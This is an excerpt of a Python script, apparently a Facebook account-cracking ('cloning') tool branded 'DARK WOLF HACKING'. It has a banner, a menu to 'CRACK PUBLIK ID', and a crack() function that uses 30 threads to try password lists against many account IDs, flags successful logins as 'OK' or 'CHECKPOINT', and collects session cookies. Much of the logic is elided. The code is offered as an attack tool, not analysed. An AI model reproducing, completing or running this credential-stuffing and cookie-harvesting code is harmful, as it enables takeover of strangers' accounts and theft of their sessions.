...
def banner():
	clear()
	sol()
	ban=''' © MASTER MIND DARK WOLF 
                      
██████╗░░█████╗░██████╗░██╗███╗░░██╗  \033[43m\033[1;91m[Programmed By DARK WOLF HACKING 😎]
██╔══██╗██╔══██╗██╔══██╗██║████╗░██║  \033[43m\033[1;91m[TELEGRAM: DARK WOLF HACKING ☠️]
██████╔╝███████║██████╦╝██║██╔██╗██║  \033[43m\033[1;91m[Facebook : THE MASTER MAFIA
██╔══██╗██╔══██║██╔══██╗██║██║╚████║  \033[43m\033[1;91m[Welcome to our cloning command ☠️]
██║░░██║██║░░██║██████╦╝██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝              '''
...
def menu(my_name,my_id):
	...
	print('')
	cetak(nel('[bold green] . CRACK PUBLIK ID\n  . CHEK RESULTS\n . EXIT [bold green]')) 
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[purple]=>[green] DARK WOLF HACKS ARE ALWAYS BEST [purple] <<[yellow] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}Dark-WolF-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ Dark-WolF-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ Dark-WolF-OK ❤️✨[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      😭HELLO THIS is DARK WOLF HACKING 🤣[purple]')) 
